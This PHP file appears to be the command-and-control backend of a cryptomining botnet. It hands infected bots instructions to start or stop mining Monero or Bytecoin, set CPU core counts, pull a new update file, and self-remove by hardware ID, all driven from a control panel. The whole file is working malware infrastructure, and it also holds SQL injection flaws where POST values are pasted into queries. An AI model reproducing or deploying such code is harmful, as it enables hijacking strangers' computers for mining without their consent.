<?php

include('db.php');

$uri = $_SERVER['REQUEST_URI'];

$db = new PDO('mysql:host=localhost;dbname=dbname;charset=utf8', "dbuser", "pass");
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

if(strpos($uri, "request")) { // Give bots commands

// Miner start
    if(isset($_POST['command']) && $_POST['command'] == "mine") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "mine"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $enabled = $data['enabled'];

        echo $enabled;
    }

    if(isset($_POST['mine']) && $_POST['mine'] == "coin") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "coin"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $coin = $data['enabled'];

        echo $coin;

    }

    if(isset($_POST['mine']) && $_POST['mine'] == "cores") {
        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "cores"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $coin = $data['enabled'];

        echo $coin;
    }
// Miner end

// Update start
    if(isset($_POST['command']) && $_POST['command'] == "update") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
		$user_data = [':command' => "update"];
		$search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $update = $data['enabled'];

        echo $update;

    }

    if(isset($_POST['command']) && $_POST['command'] == "newfile") {

        $user_query = "SELECT * FROM commands WHERE command=:command";
        $user_data = [':command' => "newfile"];
        $search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $update = $data['enabled'];

        echo $update;

    }
// Update end

}


// Recieving new commands from the panel
if(isset($_POST['command'])) { 

    if(strpos($uri, "mine")) {
        
        if(isset($_POST['enabled']) && $_POST['enabled'] == "true") {

            $user_query = 'SELECT * FROM commands WHERE command=:command';
		    $user_data = [':command' => "mine"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $enabled = $data['enabled'];

            if($enabled == "false") {

                $uquery = "UPDATE commands SET enabled='true' WHERE command=:command";
		        $udata = [':command' => "mine"];
                $search_command = DB::query($uquery, $udata);

                echo "started mining";
            }

        } else if(isset($_POST['enabled']) && $_POST['enabled'] == "false") {

            $user_query = 'SELECT * FROM commands WHERE command=:command';
		    $user_data = [':command' => "mine"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $enabled = $data['enabled'];

            if($enabled == "true") {

                $uquery = "UPDATE commands SET enabled='false' WHERE command=:command";
		        $udata = [':command' => "mine"];
                $search_command = DB::query($uquery, $udata);

                echo "stopped mining";
            }

        }

        if(isset($_POST['coin']) && $_POST['coin'] == "xmr") {

            $user_query = "SELECT * FROM commands WHERE command=:command";
		    $user_data = [':command' => "coin"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $coin = $data['enabled'];

            if($coin == "byte") {

                $uquery = "UPDATE commands SET enabled='xmr' WHERE command=:command";
		        $udata = [':command' => "coin"];
                $search_command = DB::query($uquery, $udata);

                echo "mining xmr";
            }

        } else if(isset($_POST['coin']) && $_POST['coin'] == "byte") {

            $user_query = "SELECT * FROM commands WHERE command=:command";
		    $user_data = [':command' => "coin"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $coin = $data['enabled'];

            if($coin == "xmr") {

                $uquery = "UPDATE commands SET enabled='byte' WHERE command=:command";
		        $udata = [':command' => "coin"];
                $search_command = DB::query($uquery, $udata);

                echo "mining byte";
            }

        }

        if(isset($_POST['command']) && $_POST['command'] == "cores") {

            $cores = $_POST['enabled'];
            echo $cores;

            $uquery = "UPDATE commands SET enabled='$cores' WHERE command=:command";
		    $udata = [':command' => "cores"];
            $search_command = DB::query($uquery, $udata);

            
        }

    } // end mine section

    if(strpos($uri, "update")) {

        if($_POST['enabled'] == "true") {

            $user_query = "SELECT * FROM commands WHERE command=:command";
		    $user_data = [':command' => "update"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $enabled = $data['enabled'];

            if(isset($_POST['newfile'])) {

                $newfile = $_POST['newfile'];
                $uquery = "UPDATE commands SET enabled='$newfile' WHERE command=:command";
		        $udata = [':command' => "newfile"];
                $search_command = DB::query($uquery, $udata);
                
            }

            if($enabled == "false") {

                $uquery = "UPDATE commands SET enabled='true' WHERE command=:command";
		        $udata = [':command' => "update"];
                $search_command = DB::query($uquery, $udata);

                echo "started updating";
            }

        } else if($_POST['enabled'] == "false") {

            $user_query = "SELECT * FROM commands WHERE command=:command";
		    $user_data = [':command' => "update"];
            $search_command = DB::query($user_query, $user_data);
            $data = $search_command[0];
            $enabled = $data['enabled'];

            if($enabled == "true") {

                $uquery = "UPDATE commands SET enabled='false' WHERE command=:command";
		        $udata = [':command' => "update"];
                $search_command = DB::query($uquery, $udata);

                echo "stopped updating";
            }

        }

   }



}

if(strpos($uri, "kill")) {

    if(isset($_POST['hwid'])) {

        $hwid = $_POST['hwid'];
	
        $q = "DELETE FROM `bots` WHERE `hwid` = '$hwid'";
        $exe = DB::query($q);

        // Checking if it was actually removed

        $result = $db->prepare("SELECT SQL_CALC_FOUND_ROWS `id` FROM `bots` WHERE `hwid` = '$hwid'"); 
        $result->execute();
        $result = $db->prepare("SELECT FOUND_ROWS()"); 
        $result->execute();
        $row_count = $result->fetchColumn();
        $total = $row_count;
        
        if($exists == 0) {
            echo "continue";
        } else {
            echo "test";
        }

    }

    if(isset($_POST['enabled'])) {

        $shouldkill = $_POST['enabled'];

        $user_query = "SELECT * FROM commands WHERE command=:command";
	    $user_data = [':command' => "kill"];
        $search_command = DB::query($user_query, $user_data);
        $data = $search_command[0];
        $enabled = $data['enabled'];

        if($shouldkill == "true" && $enabled == "false") {

            $uquery = "UPDATE commands SET enabled='true' WHERE command=:command";
            $udata = [':command' => "kill"];
            $search_command = DB::query($uquery, $udata);

            echo "started killing";

        } else if($shouldkill == "false" && $enabled == "true") {

            $uquery = "UPDATE commands SET enabled='false' WHERE command=:command";
            $udata = [':command' => "kill"];
            $search_command = DB::query($uquery, $udata);

            echo "stopped killing";

        }



    }

}


?>